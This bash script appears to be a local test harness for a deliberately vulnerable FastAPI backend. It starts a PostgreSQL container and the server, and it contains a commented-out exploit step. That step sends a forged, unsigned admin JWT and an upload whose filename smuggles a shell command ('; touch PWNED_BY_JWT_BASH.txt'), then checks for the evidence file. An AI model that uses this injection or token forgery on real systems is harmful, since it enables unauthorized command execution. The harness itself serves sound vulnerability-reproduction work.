#!/bin/bash

# =====================================================================
# Configuration & Styling
# =====================================================================
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

BACKEND_DIR="$HOME/data3/LLMMockSystem/test_example/project/src/backend"
EVIDENCE_FILE="${BACKEND_DIR}/PWNED_BY_JWT_BASH.txt"

SERVER_PID=""
CONTAINER_NAME=""
SERVER_PORT=""
API_ENDPOINT=""
PORT_FILE="/tmp/llm_mock_server_port.txt"

# =====================================================================
# 🧹 Unified Teardown Sequence
# =====================================================================
cleanup_all() {
    echo -e "\n${YELLOW}[⚙️ Teardown] Initiating system cleanup...${NC}"

    if [ -n "$SERVER_PID" ] && kill -0 $SERVER_PID 2>/dev/null; then
        echo -e "${YELLOW}[⚙️ Teardown] Shutting down FastAPI server (PID: $SERVER_PID)...${NC}"
        kill -9 $SERVER_PID 2>/dev/null
    fi

    if [ -n "$CONTAINER_NAME" ]; then
        echo -e "${YELLOW}[⚙️ Teardown] Stopping database container ${CONTAINER_NAME}...${NC}"
        docker stop "$CONTAINER_NAME" > /dev/null 2>&1
    fi

    # Clean up port file
    if [ -f "$PORT_FILE" ]; then
        echo -e "${YELLOW}[⚙️ Teardown] Removing port file ${PORT_FILE}...${NC}"
        rm -f "$PORT_FILE"
    fi

    echo -e "${GREEN}[⚙️ Teardown] Cleanup complete. Goodbye!${NC}"
}

trap cleanup_all EXIT

# =====================================================================
# 🐳 Phase 1: Dynamic Infrastructure (Database)
# =====================================================================
get_free_port() {
    python3 -c 'import socket; s=socket.socket(); s.bind(("", 0)); print(s.getsockname()[1]); s.close()' 2>/dev/null | tail -1
}

wait_for_db_ready() {
    local container=$1
    local timeout=30
    local start_time=$(date +%s)
    
    while true; do
        if docker exec "$container" pg_isready -U postgres > /dev/null 2>&1; then
            break
        fi
        
        local current_time=$(date +%s)
        if [ $((current_time - start_time)) -ge $timeout ]; then
            return 1
        fi
        sleep 1
    done
    
    echo -e "${YELLOW}[🐳 Phase 1] ⏳ Database replied, waiting 8 seconds to bypass internal restart cycle...${NC}"
    sleep 8
    
    if docker exec "$container" pg_isready -U postgres > /dev/null 2>&1; then
        return 0
    else
        echo -e "${RED}[🐳 Phase 1] ❌ Database failed secondary health check.${NC}"
        return 1
    fi
}

setup_database() {
    echo -e "${YELLOW}[🐳 Phase 1] Setting up PostgreSQL database...${NC}"
    
    if ! docker ps > /dev/null 2>&1; then
        echo -e "${RED}[🐳 Phase 1] ⚠️ Docker is not available!${NC}"
        exit 1
    fi
    
    DB_PORT=$(get_free_port)
    CONTAINER_NAME="llm-mock-postgres-${DB_PORT}"
    
    echo -e "${YELLOW}[🐳 Phase 1] 🎯 Free port ${DB_PORT} locked, spinning up container...${NC}"
    
    docker run -d --rm \
        --name "$CONTAINER_NAME" \
        -e POSTGRES_USER=postgres \
        -e POSTGRES_PASSWORD=changethis \
        -e POSTGRES_DB=app \
        -p "${DB_PORT}:5432" \
        postgres:14 > /dev/null
    
    if wait_for_db_ready "$CONTAINER_NAME"; then
        echo -e "${GREEN}[🐳 Phase 1] ✅ Database ready! (Port: ${DB_PORT})${NC}"
        
        export POSTGRES_SERVER="localhost"
        export POSTGRES_PORT="${DB_PORT}"
        export POSTGRES_USER="postgres"
        export POSTGRES_PASSWORD="changethis"
        export POSTGRES_DB="app"
        export SQLALCHEMY_DATABASE_URI="postgresql+psycopg2://postgres:changethis@localhost:${DB_PORT}/app"
        export DATABASE_URL="postgresql+psycopg2://postgres:changethis@localhost:${DB_PORT}/app"
    else
        echo -e "${RED}[🐳 Phase 1] ❌ Database startup timeout!${NC}"
        exit 1
    fi
}

# =====================================================================
# 🚀 Phase 2: Start Backend Server
# =====================================================================
start_server() {
    echo -e "\n${YELLOW}[🚀 Phase 2] Initializing FastAPI server startup sequence...${NC}"

    if [ ! -d "$BACKEND_DIR" ]; then
        echo -e "${RED}[🚀 Phase 2] ❌ Error: Directory not found at ${BACKEND_DIR}${NC}"
        exit 1
    fi

    cd "$BACKEND_DIR" || exit 1
    

    SERVER_PORT=$(get_free_port)
    echo -e "${YELLOW}[🚀 Phase 2] 🎯 Dynamic Server Port ${SERVER_PORT} acquired...${NC}"

    # Save port to temporary file for run_exploit.sh to read
    echo "$SERVER_PORT" > "$PORT_FILE"
    echo -e "${GREEN}[🚀 Phase 2] ✅ Port ${SERVER_PORT} saved to ${PORT_FILE}${NC}"

    python -m uvicorn app.main:app --host 127.0.0.1 --port $SERVER_PORT
}

# =====================================================================
# 💥 Phase 3: Run Exploit
# =====================================================================
# run_exploit() {
#     echo -e "\n${YELLOW}[💥 Phase 3] Step 1: Preparing dummy payload file...${NC}"
#     cd "$BACKEND_DIR" || exit 1
#     echo "This is just a dummy file." > /tmp/dummy.txt

#     echo -e "${YELLOW}[💥 Phase 3] Step 2: Firing malicious curl request to ${API_ENDPOINT}...${NC}"
    
#     curl -X POST "$API_ENDPOINT" \
#         -H "X-User-ID: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.ZmFrZV9zaWduYXR1cmVfZGF0YQ" \
#         -F 'file=@/tmp/dummy.txt;filename="test.txt; touch PWNED_BY_JWT_BASH.txt"' \
#         -s -o /dev/null

#     sleep 2

#     echo -e "${YELLOW}[💥 Phase 3] Step 3: Verifying command injection...${NC}"
#     if [ -f "$EVIDENCE_FILE" ]; then
#         echo -e "${GREEN}[+] SUCCESS! File $EVIDENCE_FILE was created by command injection!${NC}"
#         echo -e "${GREEN}[+] Exploit verified - command injection vulnerability confirmed!${NC}"
#     else
#         echo -e "${RED}[-] FAILED! $EVIDENCE_FILE was not created.${NC}"
#         echo -e "${RED}[-] Command injection attempt did not succeed.${NC}"
#     fi

#     echo -e "\n${YELLOW}[💥 Phase 3] Step 4: Cleaning up exploit traces...${NC}"
#     rm -f /tmp/dummy.txt "$EVIDENCE_FILE"
#     echo -e "${GREEN}[💥 Phase 3] Exploit trace cleanup complete.${NC}"
# }

# =====================================================================
# Main Execution Flow
# =====================================================================
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  LLM Mock System - Full Attack Chain${NC}"
echo -e "${GREEN}========================================${NC}"

setup_database
start_server
# run_exploit